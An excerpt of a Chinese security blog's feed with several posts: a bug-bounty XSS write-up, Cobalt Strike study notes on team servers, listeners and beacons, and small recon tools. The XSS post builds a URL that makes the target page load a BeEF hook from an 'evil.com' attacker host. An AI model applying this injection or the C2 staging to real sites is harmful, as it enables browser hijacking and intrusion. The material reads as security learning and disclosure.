Metasploit Framework 所设置 handler 模块的端口和 IP</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-39-58.png"></p><p>之后在 Cobalt Strike 上右击待传递的会话选择 Spawn ，选择刚刚创建的 Foreign HTTP 监听</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-54-23.png"></p><p>来到 Metasploit Framework 便能够看到会话已经传递过来了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-57-35.png"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;众所周知，Cobalt Strike 的前身是 Armitage，而 Armitage 又可以理解为</summary>
      
    
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
    
    <category term="MSF" scheme="https://www.teamssix.com/tags/MSF/"/>
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】记录一次有点儿不一样的XSS</title>
    <link href="https://www.teamssix.com/year/210107-162325.html"/>
    <id>https://www.teamssix.com/year/210107-162325.html</id>
    <published>2021-01-07T08:23:25.000Z</published>
    <updated>2021-01-07T08:26:14.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在挖SRC的时候，碰到一个有点儿不一样的XSS，在此简单记录一下。</p><p>为了展示出较好的效果同时不泄露网站相关信息， 这里我在自己本地按照当时目标的情况简单搭建了一个靶场。</p><p>注意：文中的<code>target.com</code>代指目标域名，<code>evil.com</code>代指自己的攻击域名。</p><h1 id="0x01-发现"><a href="#0x01-发现" class="headerlink" title="0x01 发现"></a>0x01 发现</h1><p>在测试过程中，发现目标存在这样的一个 URL</p><pre><code>http://target.com/index.html?/test.html</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-1.png"></p><p>在当前页面中包含了URL参数里的页面，如果将<code>/test.html</code>改为不存在的页面就会提示404</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-2.png"></p><p>查看一下源码，可以发现页面将传参的内容与站点域名进行了拼接，随后对该页面进行访问</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-3.png"></p><h1 id="0x02-思考利用"><a href="#0x02-思考利用" class="headerlink" title="0x02 思考利用"></a>0x02 思考利用</h1><p>目标看到这里，刚开始只是尝试的一些常规的 XSS Payload，发现目标都进行了很好的过滤，于是陷入了短暂的思考中。</p><p>之后再看看源码，想着既然它是把参数后的值拼接到站点域名后面，那如果我有个<code>target.com.evil.com</code>的域名，我在URL中传参<code>.evil.com</code>，页面拼接后所访问的地址不就是这样：</p><pre><code>http://target.com.evil.com</code></pre><p>这样一来，我在<code>target.com.evil.com</code>站点下，开个beef，在我访问<code>http://target.com/index.html?.evil.com</code>的时候，目标页面就会访问到我自己的域名，如果访问的域名页面中包含了 beef 的 hook.js，那目标不就上线了嘛，nice</p><p><strong>开整！</strong></p><p>首先要有个域名和 vps ，有了域名后再设置一个 <code>target.com</code> 的子域名，设置子域名也很简单，直接在域名的DNS记录中添加一条A记录即可，名称就是<code>target.com</code>，内容就是要解析的 vps IP 地址。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-4.png"></p><p>测试一下，beef 的 hook.js 能不能访问</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-5.png"></p><blockquote><p>这里有个坑，如果域名没有备案并且 vps 是国内的，如果同时 beef 开在 80 端口，就会导致页面一打开就会提示域名未备案，这时只要把 beef 放在其他不常用的端口上就不会提示域名未备案了。</p></blockquote><p>在 beef 的 hook.js 页面可以成功访问之后，就可以构造 URL 了，这时只要 URL 后传入一个包含 hook.js 的页面就可以上线了，这里以 beef 的 demo 页面<code>/demos/basic.html</code>作为示例。</p><p>最后构造 URL 为：</p><pre><code>http://target.com/index.html?.evil.com:3000/demos/basic.html</code></pre><p>浏览器打开该页面</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-6.png"></p><p>可以看到当前页面成功访问到了<code>target.com.evil.com:3000/demos/basic.html</code>，此时看看 beef 里有没有上线</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-7.png"></p><p>beef 成功上线，最后再来弹个窗，嘿嘿</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-8.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-9.png"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>这个漏洞提交上去之后，相较于之前提交的较为常规的XSS，厂商给这个XSS 是其双倍的积分。</p><p>平时自己还是要多多理解漏洞产生的原因才是，要是直接用工具扫、Fuzz字典跑估计就发现利用不了这个洞了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近在挖SRC的时候，碰到一个有点儿不一样的XSS，在此简单记录一下。&lt;/p&gt;
&lt;p&gt;为了展示出较好</summary>
      
    
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="SRC" scheme="https://www.teamssix.com/tags/SRC/"/>
    
    <category term="XSS" scheme="https://www.teamssix.com/tags/XSS/"/>
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】一款自己经常使用的URL批量识别小工具</title>
    <link href="https://www.teamssix.com/year/202025-235012.html"/>
    <id>https://www.teamssix.com/year/202025-235012.html</id>
    <published>2020-12-25T15:50:12.000Z</published>
    <updated>2020-12-25T15:57:43.775Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是一款对URL进行批量识别存活、常见端口、标题、Banner等信息的工具，虽然之前也写过类似的工具，但是要不速度太慢就是识别出来的效果不够理想。</p><p>后来发现httpx能够很好的完成这样的一个需求，但是 httpx 的命令是在有些长，每次使用都要输入很长的一段命令，而且导出的数据不够直观。</p><p>所以本工具在httpx的基础上简化了输入的命令长度同时将结果进行excel表格的导出，便于对收集到的信息进行整理。</p><p>这个工具自己也使用了差不多有1个月的时间，发现平时在做资产收集的时候，效率提升的还是很明显的，因此便打算把这个工具分享出来供大家使用，如果感觉还不错欢迎给个star。</p><p>本工具项目地址：<a href="https://github.com/teamssix/url_batch_discovery">https://github.com/teamssix/url_batch_discovery</a></p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1、安装-httpx"><a href="#1、安装-httpx" class="headerlink" title="1、安装 httpx"></a>1、安装 httpx</h2><p>在使用本工具前需要先安装httpx工具，httpx项目地址：<a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></p><p>在httpx的<a href="https://github.com/projectdiscovery/httpx/releases">releases</a>页面下载适合自己系统的安装包，然后添加到系统路径即可，最后在命令行中能成功执行<code>httpx --version</code>即表示安装成功了。</p><h1 id="2、安装本工具"><a href="#2、安装本工具" class="headerlink" title="2、安装本工具"></a>2、安装本工具</h1><pre><code>git clone https://github.com/teamssix/url_batch_discovery.gitcd url_batch_discoverypip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/python3 url_batch_discovery.py -h</code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><ul><li>命令说明</li></ul><pre><code>-h, --help  show this help message and exit-l LIST     指定URL列表文件-m MATCH    指定要匹配的关键字，返回结果中将只包含存在该关键字的内容-o OUTPUT   导出的文件路径，默认保存在./output/文件夹内，导出文件格式为xlsx，格式：/path1/path2/-p PORT     指定要检测的端口，默认只对80和443端口进行检测，格式：80,443,8000-8010-t THREADS  指定线程大小，默认50个线程-u URL      指定单个URL</code></pre><ul><li>对 url.txt 里的url进行批量识别</li></ul><pre><code>python3 url_batch_discovery.py -l url.txt</code></pre><ul><li>对 url.ttx 进行80,443,8080-8090的端口识别</li></ul><pre><code>python3 url_batch_discovery.py -l url.txt -p 80,443,8080-8090</code></pre><ul><li>对 url.ttx 进行批量识别，且只返回网页中存在“JBoos”字符的URL</li></ul><pre><code>python3 url_batch_discovery.py -l url.txt -m &quot;JBoss&quot;</code></pre><h1 id="0x03-工具截图"><a href="#0x03-工具截图" class="headerlink" title="0x03 工具截图"></a>0x03 工具截图</h1><ul><li>帮助信息</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/url_batch_discovery_1.png"></p><ul><li>导出表格</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/url_batch_discovery_2.png"></p><h1 id="0x04-注意事项"><a href="#0x04-注意事项" class="headerlink" title="0x04 注意事项"></a>0x04 注意事项</h1><ul><li>本工具使用 Python3 开发，因此需要 Python3 环境支持</li><li>本工具核心功能来自 httpx</li><li>本工具的运行速度取决于你设置的线程大小以及端口数量的多少</li><li>如果使用过程中碰到 bug，欢迎提 issue，如果帮助到你，欢迎赏个 star</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;这是一款对URL进行批量识别存活、常见端口、标题、Banner等信息的工具，虽然之前也写过类似的工具</summary>
      
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
    <category term="批量工具" scheme="https://www.teamssix.com/tags/%E6%89%B9%E9%87%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】一个爬取各大SRC厂家公告的小工具</title>
    <link href="https://www.teamssix.com/year/201115-194850.html"/>
    <id>https://www.teamssix.com/year/201115-194850.html</id>
    <published>2020-11-15T11:48:50.000Z</published>
    <updated>2020-11-15T11:59:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>平时在挖洞的时候，往往会关注其有没有活动之类的公告，但是国内那么多家厂商，一个个的去关注难免效率比较低，因此这里写了一个爬取各大SRC厂家公告的小工具，没啥技术含量，都是体力活。</p><p>工具下载地址：<a href="https://github.com/teamssix/src_notice">https://github.com/teamssix/src_notice</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>✔ 爬取各个SRC平台的公告通知</p><p>✔ 对2020年发布的活动通知进行红色高亮显示</p><p>✔ 【进阶版】将当天发布的公告推送到微信上，结合系统定时任务可实现SRC平台公告监测</p><blockquote><p><strong>在我的微信公众号“TeamsSix”后台回复“SRC”即可获得进阶版下载地址</strong></p></blockquote><p>✔ 支持的SRC平台【当前共计27家】：</p><p>360、58、阿里、阿里本地生活、爱奇艺、百度、贝壳、哔哩哔哩、菜鸟、滴滴出行、度小满、瓜子、京东、蚂蚁金服、美团、陌陌、OPPO、平安、水滴互助、顺丰、腾讯、vivo、网易、唯品会、WIFI万能钥匙、中通、字节跳动</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><pre><code>git clone https://github.com/teamssix/src_notice.gitcd src_noticepip3 install -r requirements.txtpython3 src_notice.py</code></pre><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-11-15_18-35-17.png"></p><h1 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h1><p>进阶版比普通版多了一个微信通知的功能，结合系统定时任务可实现SRC平台公告监测。<strong>在我的微信公众号“TeamsSix”后台回复“SRC”即可获得进阶版下载地址</strong></p><h3 id="如何实现微信通知？"><a href="#如何实现微信通知？" class="headerlink" title="如何实现微信通知？"></a>如何实现微信通知？</h3><p>进阶版下载好后，在 503 行代码中添加上你自己的 Server酱 key 就行了， Server酱 key 的申请地址为：<a href="http://sc.ftqq.com/">http://sc.ftqq.com/</a></p><h3 id="如何实现公告监测？"><a href="#如何实现公告监测？" class="headerlink" title="如何实现公告监测？"></a>如何实现公告监测？</h3><p>首先在 vps 上下载安装该工具，之后设置定时任务即可。比如我想在每天的上午 9 点获取一下各大 SRC 有没有新的公告：</p><p>1、输入<code>crontab -e</code></p><p>2、在打开的界面中输入<code>00 9 * * * python3 /root/src_notice/src_notice.py</code>即可。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>1、如果之前没有编辑过定时任务，第一次打开会提示选择编辑器，根据自己喜好选择即可</p><p>2、上面命令中的 <code>python3 /root/src_notice/src_notice.py</code>要修改成你自己的绝对路径，我这里是在 root 目录下的</p><h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;平时在挖洞的时候，往往会关注其有没有活动之类的公告，但是国内那么多家厂商，一个个的去关注难免效率比较低，因此这里写了一个爬取各大SRC厂家公</summary>
      
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
    <category term="批量工具" scheme="https://www.teamssix.com/tags/%E6%89%B9%E9%87%8F%E5%B7%A5%E5%85%B7/"/>
    
    <category term="SRC" scheme="https://www.teamssix.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>【建议收藏】CS学习笔记合集</title>
    <link href="https://www.teamssix.com/year/201023-192553.html"/>
    <id>https://www.teamssix.com/year/201023-192553.html</id>
    <published>2020-10-23T11:25:53.000Z</published>
    <updated>2020-10-23T05:06:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>自2020年4月份至2020年10月份，笔者更新了自己在学习 Cobalt Strike 过程中的 28 篇笔记，并将笔记同步更新到了自己的公众号、博客、CSDN、知乎、简书等平台，特在此整理成合集发布出来。</p><p>在合集中对于笔记的标题、内容顺序适当的进行了一些更改，从而使得整体看起来更加和谐。</p><p>建议收藏本文，随时翻阅查看。</p><blockquote><p>此合集仅在我的公众号和博客更新，我的公众号：TeamsSix</p></blockquote><h1 id="0x01-基础操作"><a href="#0x01-基础操作" class="headerlink" title="0x01 基础操作"></a>0x01 基础操作</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>第一次接触CS的时候，是有人在群里发了一个CS最新版的安装包，当时第一反应，CS ？？？</p><p>作为小白的我，在角落里看着群里的大佬们讨论的十分起劲儿，而我这个萌新对于他们所讨论的东西却听都没听过。</p><p>于是乎，新的一期学习笔记开整，本期学习笔记如题：《Cobalt Strike学习笔记》，简称《CS学习笔记》，这期笔记预计会更新28篇文章，学习资源来自B站视频，视频链接在文章底部。</p><p>由于这只是学习笔记，因此不会像教程一样详尽，一些我个人已经了解的东西或许不会记在笔记里，因此把笔记当做教程阅读是不合适的。</p><p><strong>CS是什么？</strong></p><p>Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><p>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</p><p>早期版本Cobalt Srtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用。</p><p>这个工具的社区版是大家熟知的Armitage(一个MSF的图形化界面工具)，而Cobalt Strike大家可以理解其为Armitage的商业版。</p><p><strong>CS的发展</strong></p><ul><li><p>Armitage [2010-2012]</p><p>Armitage是一个红队协作攻击管理工具，它以图形化方式实现了Metasploit框架的自动化攻击。Armitage采用Java构建，拥有跨平台特性。</p></li><li><p>Cobalt Strike 1.x [2012-2014]</p><p>Cobalt Strike 增强了Metasploit Framework在执行目标攻击和渗透攻击的能力。</p></li><li><p>Cobalt Strike 2.x [2014-?]</p><p>Cobalt Strike 2是应模拟黑客攻击的市场需求而出现的，Cobalt Strike 2是以malleable C2技术的需求为定位的，这个技术使Cobalt Strike的能力更强了一些。</p></li><li><p>Cobalt Strike 3.x [2015-?]</p><p>Cobalt Strike 3 的攻击和防御都不用在Metasploit Framework平台（界面）下进行。</p><p>如今 Cobalt Strike 4.0 也已经发布，改动相比 3.x 还是不小的，笔者在演示的时候使用的 Cobalt Strike 4.0，看的视频教程是 3.x 的教程。</p></li></ul><p><strong>接下来会用到的工具和环境</strong></p><ul><li>Cobalt Strike</li><li>Kali</li><li>Metasploit Framework</li><li>PowerSploit</li><li>PowerTools</li><li>Veil Evasion Framework</li></ul><h2 id="2、客户端与服务端的连接"><a href="#2、客户端与服务端的连接" class="headerlink" title="2、客户端与服务端的连接"></a>2、客户端与服务端的连接</h2><p>Cobalt Strike使用C/S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt Strike的客户端不与目标服务器进行交互，那么Cobalt Strike的客户端如何连接到团队服务器就是本文所学习的东西。</p><p><strong>准备工作</strong></p><p>Cobalt Strike的客户端想连接到团队服务器需要知道三个信息：</p><ul><li>团队服务器的外部IP地址</li><li>团队服务器的连接密码</li><li>（此项可选）决定Malleable C2工具的哪一个用户配置文件被用于团队服务器</li></ul><p>知道这些信息后，就可以使用脚本开启团队服务器了，值得注意的是Cobalt Strike团队服务器只能运行在Linux环境下。</p><p><strong>开启团队服务器</strong></p><p>开启团队服务器命令一般如下所示：</p><pre><code>./teamserver your_ip your_passowrd [config_file]</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-1.png"></p><p>服务端开启后，就可以开启客户端进行连接了</p><p><strong>连接到团队服务器</strong></p><p>在Linux下，直接运行start.sh脚本文件，输入团队服务器的IP、密码和自己的用户名进行连接</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-2.png"></p><p>点击Connect连接后，会有个提示信息，如果承认提示信息中的哈希值就是所要连接团队服务器的哈希值就点击Yes，随后即可打开CS客户端界面</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-3.png"></p><p>在Windows下的连接方法也基本一致，直接双击start.bat文件，输入IP、密码、用户名，点击Connect即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-4.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-5.png"></p><p>在连接后，团队之间就可以通过客户端进行沟通，信息共享</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-6.png"></p><p>Cobalt Strike不是用来设计指导在一个团队服务器下进行工作的，而是被设计成在一次行动中使用多个团队服务器。</p><p>这样设计的目的主要在于运行安全，如果一个团队服务器停止运行了，也不会导致整个行动的失败，所以接下来看看如何连接到多个团队服务器。</p><p><strong>连接到多个团队服务器</strong></p><p>Cobalt Strike连接到多个团队服务器也很简单，直接点击左上角的加号，输入其他团队服务器的信息后，即可连接</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-7.png"></p><h2 id="3、分布式操作"><a href="#3、分布式操作" class="headerlink" title="3、分布式操作"></a>3、分布式操作</h2><p><strong>最基本的团队服务模型</strong></p><p>这里介绍最基本的团队服务模型，具体由三个服务器构成，具体如下所示：</p><ul><li><p>临时服务器（Staging Servers）</p><p>临时服务器介于持久服务器和后渗透服务器之间，它的作用主要是方便在短时间内对目标系统进行访问。</p><p>它也是最开始用于传递payload、获取初始权限的服务器，它承担初始的权限提升和下载持久性程序的功能，因此这个服务器有较高暴露风险。</p></li><li><p>持久服务器（Long Haul Servers）</p><p>持久服务器的作用是保持对目标网络的长期访问，所以持久服务器会以较低的频率与目标保持通信。</p></li><li><p>后渗透服务器（Post-Exploitation Servers）</p><p>主要进行后渗透及横向移动的相关任务，比如对目标进行交互式访问</p></li></ul><p><strong>可伸缩红队操作模型</strong></p><p>可伸缩红队操作模型（Scaling Red Operations）分为两个层次，第一层次是针对一个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。</p><p>目标单元的工作：</p><ul><li>负责具体目标或行动的对象</li><li>获得访问权限、后渗透、横向移动</li><li>维护本地基础设施</li></ul><p>访问管理单元的工作：</p><ul><li>保持所有目标网络的访问权限</li><li>获取访问权限并接收来自单元的访问</li><li>根据需要传递对目标单元的访问</li><li>为持续回调保持全局基础环境</li></ul><p><strong>团队角色</strong></p><ul><li><p>开始渗透人员</p><p>主要任务是进入目标系统，并扩大立足点</p></li><li><p>后渗透人员</p><p>主要任务是对目标系统进行数据挖掘、对用户进行监控，收集目标系统的密钥、日志等敏感信息</p></li><li><p>本地通道管理人员</p><p>主要任务有建立基础设施、保持shell的持久性、管理回调、传递全局访问管理单元之间的会话</p></li></ul><h2 id="4、日志与报告"><a href="#4、日志与报告" class="headerlink" title="4、日志与报告"></a>4、日志与报告</h2><p><strong>日志记录</strong></p><p>Cobalt Strike的日志文件在团队服务器下的运行目录中的<code>logs</code>文件夹内，其中有些日志文件名例如<code>beacon_11309.log</code>，这里的<code>11309</code>就是beacon会话的ID。</p><p>按键的日志在<code>keystrokes</code>文件夹内，截屏的日志在<code>screenshots</code>文件夹内，截屏的日志名称一般如<code>screen_015321_4826.jpg</code>类似，其中<code>015321</code>表示时间（1点53分21秒），<code>4826</code>表示ID</p><p><strong>导出报告</strong></p><p>Cobalt Strike生成报告的目的在于培训或帮助蓝队，在<code>Reporting</code>菜单栏中就可以生成报告，关于生成的报告有以下特点：</p><ul><li>输出格式为PDF或者Word格式</li><li>可以输出自定义报告并且更改图标（Cobalt Strike –&gt; Preferences –&gt;Reporting）</li><li>可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正</li></ul><p><strong>报告类型</strong></p><ul><li>活动报告（Activity Report）<br>此报告中提供了红队活动的时间表，记录了每个后渗透活动。</li><li>主机报告（Hosts Report）<br>此报告中汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也会在此报告中。</li><li>侵害指标报告（Indicators of Compromise）<br>此报告中包括对C2拓展文件的分析、使用的域名及上传文件的MD5哈希。</li><li>会话报告（Sessions Report）<br>此报告中记录了指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。</li><li>社工报告（Social Engineering Report）<br>此报告中记录了每一轮网络钓鱼的电子邮件、谁点击以及从每个点击用户那里收集的信息。该报告还显示了Cobalt Strike的System profiler发现的应用程序。</li><li>战术、技巧和程序报告（Tactics,Techniques,and Procedures）<br>此报告将自己的Cobalt Strike行动映射到MITRE的ATT&amp;CK矩阵中的战术，具体可参考<a href="https://attack.mitre.org/">https://attack.mitre.org/</a></li></ul><h1 id="0x02-基础设施"><a href="#0x02-基础设施" class="headerlink" title="0x02 基础设施"></a>0x02 基础设施</h1><p>这一小节学起来感觉有些吃力，里面很多概念理解的不是很清楚，如果有大佬看到描述错误的地方欢迎留言指正，避免误导他人。</p><p>再次声明，这只是我的个人学习笔记，就不要当成教程去看了，建议想学习CS的小伙伴可以看看A-TEAM的中文手册或者网上的一些视频教程。</p><h2 id="1、监听器管理"><a href="#1、监听器管理" class="headerlink" title="1、监听器管理"></a>1、监听器管理</h2><ul><li><p>什么是监听器</p><p>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。</p></li><li><p>监听器的作用</p><p>主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。</p><p>比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</p></li></ul><p>一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深入了解如何准确配置监听器。</p><p>一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。</p><p>监听器的名字一般由以下结构组成：</p><pre><code>Operating System/Payload/Stager</code></pre><p>例如：</p><pre><code>windows/beacon_http/reverse_http</code></pre><p><strong>什么是传输器</strong></p><p>攻击载荷<code>payload</code>就是攻击执行的内容。攻击载荷通常被分为两部分：传输器<code>stager</code> 和传输体<code>stage</code>。</p><p>传输器<code>stager</code>是一个小程序，用于连接、下载传输体<code>stage</code>，并插入到内存中。</p><p>我个人理解为：攻击载荷里真正用于攻击的代码是在传输体里。</p><p>所以为什么要有传输体？直接把攻击载荷插入到内存中不更方便快捷、更香么，搞得又是传输器又是传输体的。</p><p>需要传输体是因为在很多攻击中对于能加载进内存，并在成功漏洞利用后执行的数据大小存在严格限制。这就导致在攻击成功时，很难嵌入额外的攻击载荷，正是因为这些限制，才使得传输器变得有必要了。</p><p><strong>创建监听器</strong></p><p>在CS客户端中打开 Cobalt Strike —》Listeners，之后点击Add，此时弹出New Listener窗口，在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。</p><p>Cobalt Strike有两种类型的监听器：</p><ul><li><p>Beacon</p><p>Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，笔者个人理解Beacon类型的监听器应该是平时比较常用的。Beacon监听器的名称例如：</p><pre><code>windows/beacon_http/reverse_http</code></pre></li><li><p>Foreign</p><p>Foreign直译就是外部的，这里可以理解成<code>对外监听器</code>，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit 框架里的Payload，笔者个人理解Foreign监听器在一定程度上提高了CS的兼容性。对外监听器的名称例如：</p><pre><code>windows/foreign/reverse_https</code></pre></li></ul><h2 id="2、HTTP-和-HTTPS-Beacon"><a href="#2、HTTP-和-HTTPS-Beacon" class="headerlink" title="2、HTTP 和 HTTPS Beacon"></a>2、HTTP 和 HTTPS Beacon</h2><p><strong>Beacon是什么</strong></p><ul><li>Beacon是CS的Payload</li><li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li><li>通过HTTP、HTTPS和DNS出口网络</li><li>使用SMB协议的时候是点对点通信</li><li>Beacon有很多的后渗透攻击模块和远程管理工具</li></ul><p><strong>Beacon的类型</strong></p><ul><li><p>HTTP 和 HTTPS Beacon</p><p>HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</p><pre><code>windows/beacon_http/reverse_httpwindows/beacon_https/reverse_https</code></pre></li><li><p>DNS Beacon</p><pre><code>windows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_http</code></pre></li><li><p>SMB Beacon</p><p>SMB Beacon也可以叫做pipe beacon</p><pre><code>windows/beacon_smb/bind_pipe</code></pre></li></ul><p><strong>创建一个HTTP Beacon</strong></p><p>点击 Cobalt Strike  –&gt; Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-1.png"></p><p>此时可以测试一下刚才设置的监听器，点击Attack –&gt; Web Drive-by –&gt; Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，因为我的靶机是64位的，所以我把Use x64 payload也给勾选上了，最后点击Launch</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-2.png"></p><p>复制弹窗的命令，放到靶机中运行</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-3.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-4.png"></p><p>此时，回到CS，就可以看到已经靶机上线了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-5.png"></p><p><strong>HTTPS Beacon</strong></p><p>HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable 